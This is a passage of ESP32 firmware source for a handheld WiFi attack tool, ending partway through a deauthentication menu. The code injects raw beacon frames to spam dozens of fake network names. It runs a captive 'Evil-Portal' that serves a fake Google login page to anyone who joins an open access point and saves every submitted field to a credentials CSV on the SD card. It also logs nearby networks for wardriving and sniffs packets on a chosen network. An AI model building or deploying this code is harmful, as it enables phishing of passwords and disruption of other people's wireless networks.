#define DEAUTHER
#include "display.h"
#include <GyverButton.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include "Explorer.h"
#include "interface.h"
#include "CONFIG.h"
#include "menu/wifi.h"
#include "deauth.h"
#include "evilportal.h"

extern DisplayType display;
extern GButton buttonUp, buttonDown, buttonOK, buttonBack;
extern bool inMenu;
extern byte currentMenu, wifiMenuIndex;
extern void OLED_printMenu(DisplayType &display, byte menuIndex);
void createDefaultPortal();
void saveCapturedDataToCSV(String csvLine);

bool inSpamMenu = false, isSpamming = false;
bool inEvilPortal = false, apRunning = false;
bool inDeauthMenu = false, isScanning = false, isDeauthing = false;
bool inWardriving = false, isWardriving = false;
bool inPacketsMenu = false, isPacketScanning = false, isPacketViewing = false;
bool wifiListUsesScanResults = false;
int foundNetworks = 0;
const int MAX_WIFI_NETWORKS = 64;
String ssidList[MAX_WIFI_NETWORKS];
const byte BEACON_LOG_LINES = 5;
String beaconLog[BEACON_LOG_LINES];
byte beaconLogSize = 0;
uint8_t bssidList[MAX_WIFI_NETWORKS][6];
int deauthMenuIndex = 0;
int packetsMenuIndex = 0;
File wardrivingFile;
int wardrivingFileNumber = 1;
unsigned long lastScanTime = 0;
const unsigned long SCAN_INTERVAL = 500;
wifi_ap_record_t apRecords[MAX_WIFI_NETWORKS];
String deauthTargetSsid = "";
wifi_ap_record_t deauthTargetRecord;
unsigned long packetsPrevTime = 0, packetsCurTime = 0;
unsigned long packetsPkts = 0, packetsDeauths = 0;
unsigned long packetsMaxVal = 0;
double packetsMultiplicator = 1.0;
bool packetsBssidSet = false;
uint16_t packetsVals[64];
char packetsSsid[33] = "";
uint8_t packetsBssid[6];
uint8_t packetsChannel = 1;

#if defined(LANGUAGE_FR_FR) || defined(LANGUAGE_PT_BR)
const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
#else 
const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
#endif
const bool wpa2 = true;
const uint8_t beaconChannels[] = {1, 6, 11};
int spread = 1, spamtype = 1;
uint8_t channelIndex = 0, wifi_channel = 1;
uint32_t packetCounter = 0;
uint8_t macAddr[6];
uint8_t beaconSpamPacket[128];
uint16_t currentBeaconOffset = 0;
const uint8_t beaconSpamChannel = 1;
const uint8_t beaconSpamFrameCount = 16;

const char Beacons[] PROGMEM = {
  "Mom Use This One\n"
  "Abraham Linksys\n"
  "Benjamin FrankLAN\n"
  "Martin Router King\n"
  "John Wilkes Bluetooth\n"
  "Pretty Fly for a Wi-Fi\n"
  "Bill Wi the Science Fi\n"
  "I Believe Wi Can Fi\n"
  "Tell My Wi-Fi Love Her\n"
  "No More Mister Wi-Fi\n"
  "LAN Solo\n"
  "The LAN Before Time\n"
  "Silence of the LANs\n"
  "House LANister\n"
  "Winternet Is Coming\n"
  "Ping's Landing\n"
  "The Ping in the North\n"
  "This LAN Is My LAN\n"
  "Get Off My LAN\n"
  "The Promised LAN\n"
  "The LAN Down Under\n"
  "FBI Surveillance Van 4\n"
  "Area 51 Test Site\n"
  "Drive-By Wi-Fi\n"
  "Planet Express\n"
  "Wu Tang LAN\n"
  "Darude LANstorm\n"
  "Never Gonna Give You Up\n"
  "Hide Yo Kids, Hide Yo Wi-Fi\n"
  "Loading…\n"
  "Searching…\n"
  "VIRUS.EXE\n"
  "Virus-Infected Wi-Fi\n"
  "Starbucks Wi-Fi\n"
  "Text 64ALL for Password\n"
  "Yell TEAPOT for Password\n"
  "The Password Is 1234\n"
  "Free Public Wi-Fi\n"
  "No Free Wi-Fi Here\n"
  "Get Your Own Damn Wi-Fi\n"
  "It Hurts When IP\n"
  "Dora the Internet Explorer\n"
  "404 Wi-Fi Unavailable\n"
  "Porque-Fi\n"
  "Titanic Syncing\n"
  "Test Wi-Fi Please Ignore\n"
  "Drop It Like It's Hotspot\n"
  "Life in the Fast LAN\n"
  "The Creep Next Door\n"
  "Ye Olde Internet\n"
};

WebServer server(80);
DNSServer dnsServer;
String capturedData = "";
const byte DNS_PORT = 53;

extern "C" {
#include "esp_wifi.h"
  esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
}

constexpr size_t BEACON_PKT_LEN = 109;
const uint8_t beaconPacketTemplate[BEACON_PKT_LEN] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x00, 0x00,
  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
  0xe8, 0x03,
  0x31, 0x00,
  0x00, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x01, 0x08,
  0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
  0x03, 0x01,
  0x01,
  0x30, 0x18,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x02, 0x00,
  0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x00, 0x00
};

static inline void prepareBeaconPacket(
  uint8_t outPacket[BEACON_PKT_LEN], const uint8_t macAddr[6], const char *ssid, uint8_t ssidLen,
  uint8_t channel, bool setWPAflag = true
) {
  memcpy(outPacket, beaconPacketTemplate, BEACON_PKT_LEN);
  memcpy(&outPacket[10], macAddr, 6);
  memcpy(&outPacket[16], macAddr, 6);
  memset(&outPacket[38], 0x20, 32);
  if (ssidLen > 32) ssidLen = 32;
  outPacket[37] = ssidLen;
  if (ssidLen > 0) {
    memcpy(&outPacket[38], ssid, ssidLen);
  }
  outPacket[82] = channel;
  outPacket[34] = setWPAflag ? 0x31 : 0x21;
}

void generateRandomWiFiMac(uint8_t *mac) {
  mac[0] = 0x02;
  for (int i = 1; i < 6; i++) {
    mac[i] = random(0, 255);
  }
}

void generateBeaconSpamMac(uint8_t *mac) {
  for (uint8_t i = 0; i < 6; i++) {
    mac[i] = random(256);
  }
  mac[0] |= 0x02;
  mac[0] &= 0xFE;
}

uint16_t generateBeaconSpamPacket(const char *ssid) {
  static const uint8_t packetHeader[38] = {
    0x80, 0x00,
    0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x11, 0x00,
    0x00, 0x00
  };

  uint8_t ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;

  memset(beaconSpamPacket, 0, sizeof(beaconSpamPacket));
  memcpy(beaconSpamPacket, packetHeader, sizeof(packetHeader));

  generateBeaconSpamMac(macAddr);
  memcpy(&beaconSpamPacket[10], macAddr, 6);
  memcpy(&beaconSpamPacket[16], macAddr, 6);

  beaconSpamPacket[36] = 0x00;
  beaconSpamPacket[37] = ssidLen;
  memcpy(&beaconSpamPacket[38], ssid, ssidLen);

  return 38 + ssidLen;
}

void setupBeaconSpamWifi() {
  randomSeed(esp_random());
  currentBeaconOffset = 0;
  WiFi.disconnect();
  WiFi.mode(WIFI_AP);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_channel(beaconSpamChannel, WIFI_SECOND_CHAN_NONE);
}

void teardownBeaconSpamWifi() {
  esp_wifi_set_promiscuous(false);
  WiFi.disconnect();
  WiFi.mode(WIFI_OFF);
  memset(beaconSpamPacket, 0, sizeof(beaconSpamPacket));
  memset(macAddr, 0, sizeof(macAddr));
}

#define MAX_PORTAL_FILES 50
static const char* portalExts[] = {".html", ".htm"};
ExplorerEntry portalFileList[MAX_PORTAL_FILES];
ExplorerState portalExplorer;
ExplorerConfig portalExplorerCfg = {"/WiFi/Portals", portalExts, 2, true, true, true, true};
bool inPortalExplorer = false;
String getCurrentPortalHtml = "";

void loadPortalFileList() {
  if (!SD.exists(portalExplorerCfg.rootDir)) {
    SD.mkdir(portalExplorerCfg.rootDir);
  }
  createDefaultPortal();
  if (portalExplorer.currentDir.length() == 0) {
    portalExplorer.currentDir = portalExplorerCfg.rootDir;
  }
  ExplorerLoad(portalExplorer, portalExplorerCfg);
}

void drawPortalExplorer() {
  ExplorerDraw(portalExplorer, display);
}

bool loadSelectedPortal() {
  String fullPath = portalExplorer.currentDir + "/" + portalExplorer.selectedFile;
  File file = SD.open(fullPath, FILE_READ);
  if (!file) {
    return false;
  }
  getCurrentPortalHtml = "";
  while (file.available()) {
    getCurrentPortalHtml += (char)file.read();
  }
  file.close();
  return true;
}

String getCurrentWardrivingFileName() {
  return "/WiFi/Wardriving/Wardriving_" + String(wardrivingFileNumber) + ".txt";
}

void displaySeparatorLine() {
  int16_t y = display.getCursorY();
  display.setCursor(1, y - 1);
  display.print(F("---------------------"));
  display.setCursor(0, y + 8);
}

void displaySpamPrompt() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(3, 3);
  display.println(F("Press OK."));
  displaySeparatorLine();
  display.display();
}

void stopBeaconSpamAndExit() {
  isSpamming = false;
  inSpamMenu = false;
  teardownBeaconSpamWifi();
  buttonOK.resetStates();
  buttonBack.resetStates();
  displayWiFiMenu(display, wifiMenuIndex);
}

void clearBeaconLog() {
  beaconLogSize = 0;
  for (byte i = 0; i < BEACON_LOG_LINES; i++) beaconLog[i] = "";
}

void appendBeaconLine(const String &line) {
  if (beaconLogSize < BEACON_LOG_LINES) {
    beaconLog[beaconLogSize++] = line;
  } else {
    for (byte i = 1; i < BEACON_LOG_LINES; i++) {
      beaconLog[i - 1] = beaconLog[i];
    }
    beaconLog[BEACON_LOG_LINES - 1] = line;
  }
}

void pushBeaconLog(const String &ssid) {
  if (ssid.length() == 0) {
    appendBeaconLine("");
    return;
  }
  appendBeaconLine(ssid);
}

void displaySpamActive() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setTextWrap(false);
  display.setCursor(3, 3);
  display.println(F("WiFi-Spam..."));
  displaySeparatorLine();
  int16_t startY = display.getCursorY();
  for (byte i = 0; i < beaconLogSize; i++) {
    display.setCursor(1, startY + i * 8);
    display.println(beaconLog[i]);
  }
  display.display();
}

void displayEvilPortalScreen() {
  Serial.print(F("EvilPortal:"));
  Serial.println(capturedData);
  
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(3, 3);
  display.println(F("Evil-Portal"));
  display.setCursor(1, 10);
  display.println(F("IP: 192.168.4.1"));
  displaySeparatorLine();
  
  if (capturedData != "") {
    display.setCursor(1, 30);
    int newlineIndex = capturedData.indexOf('\n');
    String firstLine = newlineIndex != -1 ? capturedData.substring(0, newlineIndex) : capturedData;
    String secondLine = newlineIndex != -1 ? capturedData.substring(newlineIndex + 1) : "";
    if (firstLine.length() > 20) firstLine = firstLine.substring(0, 17) + "...";
    if (secondLine.length() > 20) secondLine = secondLine.substring(0, 17) + "...";
    display.println(firstLine);
    if (display.getCursorY() < 50 && secondLine != "") {
      display.setCursor(1, display.getCursorY() + 10);
      display.println(secondLine);
    }
  }
  display.display();
}

void displayDeauthActive(String ssid) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(3, 3);
  display.println(F("Deauth..."));
  displaySeparatorLine();
  display.setCursor(4, display.getCursorY());
  display.println(ssid.substring(0, 15));
  display.display();
}

void displayWardrivingPrompt() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(3, 3);
  display.println(F("Press OK."));
  displaySeparatorLine();
  display.display();
}

const char* getAuthModeString(wifi_auth_mode_t authMode) {
  switch (authMode) {
    case WIFI_AUTH_OPEN: return "Open";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
#ifdef WIFI_AUTH_WPA2_ENTERPRISE
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-ENT";
#endif
#ifdef WIFI_AUTH_WPA3_PSK
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
#endif
#ifdef WIFI_AUTH_WPA2_WPA3_PSK
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
#endif
#ifdef WIFI_AUTH_WAPI_PSK
    case WIFI_AUTH_WAPI_PSK: return "WAPI";
#endif
    default: return "Other";
  }
}

void displayWardrivingActive() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(3, 3);
  display.println(F("Wardriving..."));
  displaySeparatorLine();
  if (foundNetworks > 0) {
    display.setCursor(2, display.getCursorY());
    display.print(foundNetworks);
    display.print(F(". "));
    display.println(ssidList[0].substring(0, 15));
    char bssidStr[18];
    snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             bssidList[0][0], bssidList[0][1], bssidList[0][2],
             bssidList[0][3], bssidList[0][4], bssidList[0][5]);
    display.setCursor(2, display.getCursorY());
    display.print(F("MAC: "));
    display.println(bssidStr);
    display.setCursor(2, display.getCursorY());
    display.print(F("Enc: "));
    display.println(getAuthModeString(apRecords[0].authmode));
    display.setCursor(2, display.getCursorY());
    display.print(F("RSSI: "));
    display.println(apRecords[0].rssi);
  }
  display.display();
}

void nextChannel() {
  if (sizeof(channels) > 1) {
    uint8_t ch = channels[channelIndex++];
    if (channelIndex >= sizeof(channels)) channelIndex = 0;
    if (ch != wifi_channel && ch >= 1 && ch <= 14) {
      wifi_channel = ch;
      esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
      Serial.print(F("Channel: "));
      Serial.println(wifi_channel);
    }
  }
}

bool packetsExtractBssid(const uint8_t *payload, uint16_t len, uint8_t *outBssid) {
  if (len < 24) return false;
  uint8_t fc1 = payload[1];
  bool toDS = fc1 & 0x01;
  bool fromDS = fc1 & 0x02;

  const uint8_t *addr1 = payload + 4;
  const uint8_t *addr2 = payload + 10;
  const uint8_t *addr3 = payload + 16;

  if (!toDS && !fromDS) {
    memcpy(outBssid, addr3, 6);
    return true;
  }
  if (toDS && !fromDS) {
    memcpy(outBssid, addr1, 6);
    return true;
  }
  if (!toDS && fromDS) {
    memcpy(outBssid, addr2, 6);
    return true;
  }
  return false;
}

void packetsSniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  const uint8_t *payload = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;

  if (!packetsBssidSet) return;

  uint8_t bssid[6];
  if (!packetsExtractBssid(payload, len, bssid)) return;

  if (memcmp(bssid, packetsBssid, 6) != 0) return;

  packetsPkts++;
  if (payload[0] == 0xC0 || payload[0] == 0xA0) {
    packetsDeauths++;
  }
}

void packetsResetGraph() {
  for (int i = 0; i < 64; i++) packetsVals[i] = 0;
  packetsPkts = 0;
  packetsDeauths = 0;
  packetsMultiplicator = 1.0;
  packetsPrevTime = millis();
}

void packetsGetMultiplicator() {
  packetsMaxVal = packetsVals[0];
  for (int i = 1; i < 64; i++) {
    if (packetsVals[i] > packetsMaxVal) packetsMaxVal = packetsVals[i];
  }
  if (packetsMaxVal < 1) packetsMaxVal = 1;
  packetsMultiplicator = packetsMaxVal > 45 ? (double)45 / packetsMaxVal : 1;
}

void packetsStartSniffing(uint8_t channel) {
  init_deauth_wifi();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&packetsSniffer);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  packetsResetGraph();
}

void packetsStopSniffing() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  WiFi.mode(WIFI_OFF);
  packetsBssidSet = false;
}

void displayPacketsGraph() {
  packetsCurTime = millis();
  if (packetsCurTime - packetsPrevTime < 135) return; // Packets Speed
  packetsPrevTime = packetsCurTime;

  for (int i = 0; i < 63; i++) {
    packetsVals[i] = packetsVals[i + 1];
  }
  packetsVals[63] = packetsPkts;

  packetsGetMultiplicator();

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(3, 3);

  char displaySsid[21];
  strncpy(displaySsid, packetsSsid, 20);
  displaySsid[20] = '\0';
  display.print(displaySsid);
  display.setCursor(1, 10);
  displaySeparatorLine();

  for (int i = 0; i < 63; i++) {
    int bar = packetsVals[i] * packetsMultiplicator; // Graph height
    if (bar > 0) {
      int x = i * 2;
      int top = 63 - bar;
      if (top < 0) top = 0;
      display.drawLine(x, 63, x, top, SH110X_WHITE);
      display.drawLine(x + 1, 63, x + 1, top, SH110X_WHITE);
    }
  }

  display.display();

  packetsDeauths = 0;
  packetsPkts = 0;
}

void beaconSpamList(const char list[]) {
  buttonOK.tick();
  buttonBack.tick();
  if (buttonBack.isRelease()) {
    stopBeaconSpamAndExit();
    return;
  }
  if (buttonOK.isClick()) {
    isSpamming = false;
    teardownBeaconSpamWifi();
    return;
  }

  esp_wifi_set_channel(beaconSpamChannel, WIFI_SECOND_CHAN_NONE);
  wifi_channel = beaconSpamChannel;

  char firstSSID[33] = "";
  uint16_t listLen = strlen_P(list);

  for (uint8_t i = 0; i < beaconSpamFrameCount && isSpamming; i++) {
    buttonBack.tick();
    if (buttonBack.isRelease()) {
      stopBeaconSpamAndExit();
      return;
    }

    if (currentBeaconOffset >= listLen) currentBeaconOffset = 0;

    char ssid[33];
    uint8_t ssidLen = 0;
    char c = pgm_read_byte(list + currentBeaconOffset);
    while (c != '\0' && c != '\n') {
      if (ssidLen < sizeof(ssid) - 1) {
        ssid[ssidLen++] = c;
      }
      currentBeaconOffset++;
      c = pgm_read_byte(list + currentBeaconOffset);
    }
    ssid[ssidLen] = '\0';

    if (c == '\n') currentBeaconOffset++;
    if (c == '\0') currentBeaconOffset = 0;
    if (ssidLen == 0) continue;

    if (firstSSID[0] == '\0') {
      strncpy(firstSSID, ssid, sizeof(firstSSID) - 1);
      firstSSID[sizeof(firstSSID) - 1] = '\0';
    }

    uint16_t packetSize = generateBeaconSpamPacket(ssid);

    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, beaconSpamPacket, packetSize, false);
    if (result == ESP_OK) {
      packetCounter++;
    }
  }

  pushBeaconLog(String(firstSSID));
  displaySpamActive();
}

void handlePostRequest() {
  capturedData = "";
  String csvLine = "";
  for (uint8_t i = 0; i < server.args(); i++) {
    String argName = server.argName(i);
    String argValue = server.arg(i);
    
    if (argName == "q" || argName.startsWith("cup2") || argName.startsWith("plain") ||
        argName == "P1" || argName == "P2" || argName == "P3" || argName == "P4") {
      continue;
    }
    
    capturedData += argValue + "\n";
    
    if (i > 0) csvLine += ",";
    csvLine += argName + ":" + argValue;
  }
  
  if (capturedData == "") capturedData = "No valid data";
  
  saveCapturedDataToCSV(csvLine);
  
  digitalWrite(2, HIGH);
  delay(50);
  digitalWrite(2, LOW);
  
  displayEvilPortalScreen();
  
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void saveCapturedDataToCSV(String csvLine) {
  if (csvLine == "") return;
  
  String filePath = "/WiFi/Portals/captured_creds.csv";
  File file = SD.open(filePath, FILE_APPEND);
  if (!file) return;
  file.println(csvLine);
  file.close();
}

void createDefaultPortal() {
  String path = "/WiFi/Portals/Google.html";
  if (SD.exists(path)) return;

  File file = SD.open(path, FILE_WRITE);
  if (!file) return;

  const char* p = portalHtml;
  char c;
  while ((c = pgm_read_byte(p++))) {
    file.write(c);
  }
  file.close();
}

void startEvilPortal() {
  pinMode(2, OUTPUT);
  digitalWrite(2, LOW);

  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(wifiPortalName, "");
  Serial.println(F("AP started. IP: 192.168.4.1"));

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  server.on("/", HTTP_GET, []() {
    server.send(200, "text/html", getCurrentPortalHtml.c_str());
  });

  server.on("/post", HTTP_POST, handlePostRequest);

  server.onNotFound([]() {
    if (server.method() == HTTP_POST || server.args() > 0) {
      handlePostRequest();
    } else {
      server.sendHeader("Location", "/", true);
      server.send(302, "text/plain", "");
    }
  });

  server.begin();
  apRunning = true;
}

void stopEvilPortal() {
  server.close();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  delay(100);
  apRunning = false;
  capturedData = "";
  digitalWrite(2, LOW);

  extern SPIClass sdSPI;
  sdSPI.end();
  delay(100);
  sdSPI.begin(SD_CLK, SD_MISO, SD_MOSI);
  SD.begin(SD_CS, sdSPI);
}

void startWardriving() {
  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_max_tx_power(82);

  if (!SD.exists("/WiFi/Wardriving")) {
    SD.mkdir("/WiFi/Wardriving");
  }
  while (SD.exists(getCurrentWardrivingFileName())) {
    wardrivingFileNumber++;
  }

  String fileName = getCurrentWardrivingFileName();
  wardrivingFile = SD.open(fileName, FILE_WRITE);
  if (wardrivingFile) {
    wardrivingFile.println(F("Wardriving started."));
    wardrivingFile.println(F("=================="));
  }
  isWardriving = true;
  foundNetworks = 0;
  lastScanTime = 0;
  WiFi.scanNetworks(true, true);
  displayWardrivingActive();
}

void finishWardriving() {
  if (wardrivingFile) {
    wardrivingFile.println(F("=================="));
    wardrivingFile.println(F("Wardriving finished."));
    wardrivingFile.close();
  }
  WiFi.scanDelete();
  WiFi.mode(WIFI_OFF);
  isWardriving = false;
  foundNetworks = 0;
}

bool isNetworkUnique(String ssid, uint8_t* bssid) {
  for (int i = 0; i < foundNetworks; i++) {
    if (ssid == ssidList[i] && memcmp(bssid, bssidList[i], 6) == 0) return false;
  }
  return true;
}

void scanNetworks() {
  if (millis() - lastScanTime >= SCAN_INTERVAL) {
    int newFoundNetworks = WiFi.scanComplete();
    if (newFoundNetworks >= 0) {
      if (newFoundNetworks > 0 && wardrivingFile) {
        for (int i = 0; i < newFoundNetworks; i++) {
          wifi_ap_record_t *record = (wifi_ap_record_t *)WiFi.getScanInfoByIndex(i);
          if (record) {
            String ssid = WiFi.SSID(i);
            if (isNetworkUnique(ssid, record->bssid)) {
              for (int j = min(foundNetworks, MAX_WIFI_NETWORKS - 1); j > 0; j--) {
                ssidList[j] = ssidList[j - 1];
                memcpy(&apRecords[j], &apRecords[j - 1], sizeof(wifi_ap_record_t));
                memcpy(&bssidList[j], &bssidList[j - 1], 6);
              }
              ssidList[0] = ssid;
              memcpy(&apRecords[0], record, sizeof(wifi_ap_record_t));
              memcpy(&bssidList[0], record->bssid, 6);
              foundNetworks = min(foundNetworks + 1, MAX_WIFI_NETWORKS);

              char bssidStr[18];
              snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                       record->bssid[0], record->bssid[1], record->bssid[2],
                       record->bssid[3], record->bssid[4], record->bssid[5]);

              wardrivingFile.print(foundNetworks);
              wardrivingFile.print(F(". "));
              wardrivingFile.println(ssid);
              wardrivingFile.print(F("MAC: "));
              wardrivingFile.println(bssidStr);
              wardrivingFile.print(F("Enc: "));
              wardrivingFile.println(getAuthModeString(record->authmode));
              wardrivingFile.print(F("RSSI: "));
              wardrivingFile.println(record->rssi);
              wardrivingFile.println();
              wardrivingFile.flush();
            }
          }
        }
        WiFi.scanDelete();
        WiFi.scanNetworks(true, true);
      }
      lastScanTime = millis();
    }
  }
}

void handleWardriving() {
  buttonOK.tick();
  buttonBack.tick();

  if (isWardriving) {
    scanNetworks();
    displayWardrivingActive();
  } else {
    displayWardrivingPrompt();
  }

  if (buttonOK.isClick()) {
    if (!isWardriving) startWardriving();
    else { finishWardriving(); displayWardrivingPrompt(); }
  }

  if (buttonBack.isClick()) {
    if (isWardriving) finishWardriving();
    inWardriving = false;
    displayWiFiMenu(display, wifiMenuIndex);
  }
}

int getStoredWiFiNetworkCount() {
  if (wifiListUsesScanResults) return max(foundNetworks, 0);
  return min(foundNetworks, MAX_WIFI_NETWORKS);
}

String getDisplayedWiFiNetworkName(int index) {
  if (wifiListUsesScanResults) return WiFi.SSID(index);
  return ssidList[index];
}

void printWiFiNetworkName(const String &ssid, int16_t x, int16_t y, int16_t maxWidth, bool selected) {
  static String marqueeText = "";
  static unsigned long marqueeStartedAt = 0;

  int16_t x1, y1;
  uint16_t textWidth, textHeight;
  display.getTextBounds(ssid, x, y, &x1, &y1, &textWidth, &textHeight);

  if (!selected || textWidth <= maxWidth) {
    if (selected) {
      marqueeText = "";
      marqueeStartedAt = 0;
    }
    display.setCursor(x, y);
    display.print(ssid);
    return;
  }

  if (marqueeText != ssid) {
    marqueeText = ssid;
    marqueeStartedAt = millis();
  }

  const uint8_t charWidth = 6;
  const int visibleChars = max(1, maxWidth / charWidth);
  String marquee = ssid + F("   ");
  int maxOffset = marquee.length() - visibleChars;
  if (maxOffset < 0) maxOffset = 0;

  int offset = 0;
  const unsigned long initialPauseMs = 1000;
  const unsigned long loopPauseMs = 500;
  const unsigned long stepMs = 300;
  unsigned long elapsed = millis() - marqueeStartedAt;
  if (maxOffset > 0 && elapsed >= initialPauseMs) {
    unsigned long scrollDuration = (maxOffset + 1) * stepMs;
    unsigned long cyclePosition = (elapsed - initialPauseMs) % (scrollDuration + loopPauseMs);
    if (cyclePosition < scrollDuration) {
      offset = cyclePosition / stepMs;
    }
  }

  display.setCursor(x, y);
  display.print(marquee.substring(offset, offset + visibleChars));
}

void drawWiFiNetworkListFrame(
  int selectedIndex, int16_t arrowY = -1
) {
  int networkCount = getStoredWiFiNetworkCount();
  if (networkCount <= 0) return;
  selectedIndex = min(max(selectedIndex, 0), networkCount - 1);

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setTextWrap(false);
  display.setCursor(3, 3);
  display.println(F("Networks:"));
  displaySeparatorLine();

  const int16_t arrowX = 5;
  const int16_t textX = 17;
  const int16_t rowHeight = 10;
  const int visibleRows = 5;
  const int startY = display.getCursorY();
  const int16_t maxTextWidth = display.width() - textX;
  int startIndex = selectedIndex - (visibleRows - 1);
  startIndex = min(max(0, startIndex), max(0, networkCount - visibleRows));
  int16_t selectedRowY = startY + (selectedIndex - startIndex) * rowHeight;
  if (arrowY < 0) arrowY = selectedRowY;

  for (int i = startIndex; i < min(networkCount, startIndex + visibleRows); i++) {
    int16_t rowY = startY + (i - startIndex) * rowHeight;
    printWiFiNetworkName(getDisplayedWiFiNetworkName(i), textX, rowY, maxTextWidth, i == selectedIndex);
  }
  display.setCursor(arrowX, arrowY);
  display.print(F(">"));
  display.display();
}

void drawWiFiNetworkList(int selectedIndex, int previousIndex = -1) {
  if (previousIndex < 0 || previousIndex == selectedIndex) {
    drawWiFiNetworkListFrame(selectedIndex);
    return;
  }

  int networkCount = getStoredWiFiNetworkCount();
  if (networkCount <= 0) return;
  selectedIndex = min(max(selectedIndex, 0), networkCount - 1);
  previousIndex = min(max(previousIndex, 0), networkCount - 1);

  const int16_t rowHeight = 10;
  const int16_t startY = 19;
  const int visibleRows = 5;
  int startIndex = selectedIndex - (visibleRows - 1);
  startIndex = min(max(0, startIndex), max(0, networkCount - visibleRows));
  int16_t fromY = startY + (previousIndex - startIndex) * rowHeight;
  int16_t toY = startY + (selectedIndex - startIndex) * rowHeight;

  const byte steps = 4;
  for (byte step = 1; step <= steps; step++) {
    int progress = (step * 100) / steps;
    int eased = progress < 50
      ? (2 * progress * progress) / 100
      : 100 - (2 * (100 - progress) * (100 - progress)) / 100;
    int16_t arrowY = fromY + ((toY - fromY) * eased) / 100;
    drawWiFiNetworkListFrame(selectedIndex, arrowY);
    delay(1);
  }
  drawWiFiNetworkListFrame(selectedIndex, toY);
}

void handleDeauthSubmenu() {
  buttonUp.tick();
  buttonDown.tick();
  buttonOK.tick();
  buttonBack.tick();

  if (isScanning) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SH110X_WHITE);
    display.setCursor(3, 3);
    display.println(F("Scanning:"));
    displaySeparatorLine();
    display.setCursor(2, display.getCursorY());
    display.println(F("..."));
    display.display();

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    foundNetworks = WiFi.scanNetworks(false, true);
    if (foundNetworks > 0) {
      isScanning = false;
      wifiListUsesScanResults = true;
      deauthMenuIndex = 0;
      for (int i = 0; i < min(foundNetworks, MAX_WIFI_NETWORKS); i++) {
        ssidList[i] = WiFi.SSID(i);
        wifi_ap_record_t *record = (wifi_ap_record_t *)WiFi.getScanInfoByIndex(i);
        if (record) {
          memcpy(&apRecords[i], record, sizeof(wifi_ap_record_t));
        }
      }
    } else {
      display.clearDisplay();
      display.setTextSize(1);
      display.setTextColor(SH110X_WHITE);
      display.setCursor(3, 3);
      display.print(F("No networks found"));
      display.display();
      delay(2000);
      isScanning = false;
      inDeauthMenu = false;
      displayWiFiMenu(display, wifiMenuIndex);
      Serial.println(F("No networks found"));
      return;
    }
  }

